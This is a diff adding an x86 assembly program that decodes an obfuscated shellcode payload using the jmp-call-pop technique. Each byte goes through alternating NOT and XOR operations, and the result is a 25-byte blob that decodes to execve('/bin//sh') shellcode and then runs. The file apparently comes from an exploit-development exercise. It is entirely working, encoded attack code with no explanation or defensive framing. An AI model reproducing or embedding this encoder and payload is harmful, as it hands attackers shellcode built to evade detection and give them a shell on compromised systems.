@@ -1,0 +1,30 @@
+; xor-not-xor-not decoder
+
+global _start			
+
+section .text
+_start:
+	jmp short call_shellcode
+
+decoder:
+	pop esi
+	xor ecx, ecx
+	mov cl, 25
+
+decode:	
+	; not decode
+	not byte [esi]
+	; xor decode 			
+	xor byte [esi], 0xBB
+	; not decode
+	not byte [esi]
+	; xor decode 			
+	xor byte [esi], 0xAA
+	inc esi
+	loop decode
+
+	jmp short EncodedShellcode
+
+call_shellcode:
+	call decoder
+	EncodedShellcode: db 0x20,0xd1,0x41,0x79,0x3e,0x3e,0x62,0x79,0x79,0x3e,0x73,0x78,0x7f,0x98,0xf2,0x41,0x98,0xf3,0x42,0x98,0xf0,0xa1,0x1a,0xdc,0x91
